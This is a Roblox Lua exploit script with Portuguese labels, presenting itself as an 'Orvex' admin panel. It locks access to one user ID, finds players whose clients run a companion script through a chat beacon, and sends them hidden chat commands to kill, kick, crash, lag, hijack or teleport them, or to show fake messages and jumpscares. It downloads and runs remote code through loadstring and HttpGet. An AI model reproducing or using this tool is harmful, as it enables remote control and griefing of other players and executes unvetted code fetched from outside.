local DONO_USERID = 2980742903
local Players = game:GetService("Players")
local jogador = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)

if jogador.UserId ~= DONO_USERID then jogador:Kick("Acesso negado.") return end

local clientesAtivos = {}
local usuarioSelecionadoTroll = ""
local usuarioSelecionadoTP = ""
local textoFakeMensagem = ""

TextChatService.OnIncomingMessage = function(mensagemObj)
    local texto = mensagemObj.Text
    local remetente = mensagemObj.TextSource
    if texto == "new123" and remetente then
        local playerInstancia = Players:GetPlayerByUserId(remetente.UserId)
        if playerInstancia and playerInstancia ~= jogador then
            clientesAtivos[playerInstancia.Name] = os.clock()
        end
    end
end

local function obterListaJogadoresDedicada()
    local lista = {}
    local tempoLimite = os.clock() - 25
    for nome, t in pairs(clientesAtivos) do
        if Players:FindFirstChild(nome) and t > tempoLimite then
            table.insert(lista, nome)
        else
            clientesAtivos[nome] = nil
        end
    end
    if #lista == 0 then return {"Nenhum usuário detectado"} end
    return lista
end

local function enviarComandoRede(cmd, arg, forcarSemAlvo)
    if (usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado") or (usuarioSelecionadoTP ~= "" and usuarioSelecionadoTP ~= "Nenhum usuário detectado") or forcarSemAlvo then
        if canalGeral then
            pcall(function()
                if forcarSemAlvo and cmd == "verificar" then
                    canalGeral:SendAsync(".ovx verificar")
                else
                    canalGeral:SendAsync(string.format(".ovx %s %s", cmd, arg))
                end
            end)
        end
    end
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
local Window = Rayfield:CreateWindow({
    name = "ORVEX | ADMIN PAINEL", 
    subtitle = "Gerenciamento Otimizado", 
    theme = "Default"
})

local TabMonitor = Window:CreateTab({ name = "Monitor", icon = "rbxassetid://100604009889706" })
local TabTroll = Window:CreateTab({ name = "Troll", icon = "rbxassetid://10651147057" })
local TabTP = Window:CreateTab({ name = "Teleporte", icon = "rbxassetid://125823673784681" })

TabMonitor:CreateSection({ name = "Gerenciamento e Varredura Manual" })
TabMonitor:CreateButton({
    name = "Verificar Rede (Detectar Usuários)",
    Callback = function()
        enviarComandoRede("verificar", "", true)
        Window:Notify({title = "Varredura", content = "Comando de verificação enviado!", duration = 3})
    end
})

local LabelContador = TabMonitor:CreateText({ name = "Contador", text = "Usuários com script ativo: 0" })
local LabelLista = TabMonitor:CreateText({ name = "Usuários Online", text = "Aperte em Verificar Rede para escanear." })

local DropdownTroll = TabTroll:CreateDropdown({
    name = "Selecionar Alvo da Rede",
    options = obterListaJogadoresDedicada(),
    currentOption = "",
    multipleOptions = false,
    callback = function(opcao) usuarioSelecionadoTroll = opcao end
})

TabTroll:CreateButton({name = "Reduzir Vitalidade (25 HP)", callback = function() enviarComandoRede("hp", "") end})
TabTroll:CreateButton({name = "Eliminar Personagem (Kill)", callback = function() enviarComandoRede("kill", "") end})
TabTroll:CreateButton({name = "Expulsar do Jogo (Kick)", callback = function() enviarComandoRede("kick", "Removido por Orvex Admin.") end})

TabTroll:CreateSection({ name = "Modificadores Contínuos" })
TabTroll:CreateToggle({name = "Aplicar Lag Intenso (15s delay)", currentValue = false, callback = function(v) enviarComandoRede("lag", v and "on" or "off") end})
TabTroll:CreateToggle({name = "Controlar / Puxar Personagem", currentValue = false, callback = function(v) enviarComandoRede("control", v and "on" or "off") end})

TabTroll:CreateSection({ name = "Interrupções Visuais" })
TabTroll:CreateInput({name = "Texto Fake", placeholderText = "Escreva aqui...", callback = function(t) textoFakeMensagem = t end})
TabTroll:CreateButton({name = "Enviar Mensagem Simulada", callback = function() enviarComandoRede("fake", textoFakeMensagem) end})
TabTroll:CreateButton({name = "Provocar Travamento (Crash)", callback = function() enviarComandoRede("crash", "") end})
TabTroll:CreateToggle({name = "Efeito Susto", currentValue = false, callback = function(v) enviarComandoRede(v and "jumpscare" or "unjumpscare", "") end})

TabTP:CreateSection({ name = "Teleporte de Usuários" })
local DropdownTP = TabTP:CreateDropdown({
    name = "Selecionar Usuário para Puxar",
    options = obterListaJogadoresDedicada(),
    currentOption = "",
    multipleOptions = false,
    callback = function(opcao) usuarioSelecionadoTP = opcao end
})
TabTP:CreateButton({
    name = "Trazer Usuário até Mim",
    Callback = function()
        if usuarioSelecionadoTP ~= "" and usuarioSelecionadoTP ~= "Nenhum usuário detectado" then
            local antigoAlvo = usuarioSelecionadoTroll
            usuarioSelecionadoTroll = usuarioSelecionadoTP
            enviarComandoRede("tp", "")
            usuarioSelecionadoTroll = antigoAlvo
            Window:Notify({title = "Teleporte", content = "Trazendo " .. usuarioSelecionadoTP, duration = 3})
        end
    end
})

task.spawn(function()
    while task.wait(2) do
        pcall(function()
            local ativos = obterListaJogadoresDedicada()
            DropdownTroll:Refresh(ativos)
            DropdownTP:Refresh(ativos)
            if ativos == "Nenhum usuário detectado" then
                LabelContador:Set("Usuários com script ativo: 0")
                LabelLista:Set("Online: Nenhum")
            else
                LabelContador:Set("Usuários com script ativo: " .. #ativos)
                LabelLista:Set("Online: " .. table.concat(ativos, ", "))
            end
        end)
    end
end)
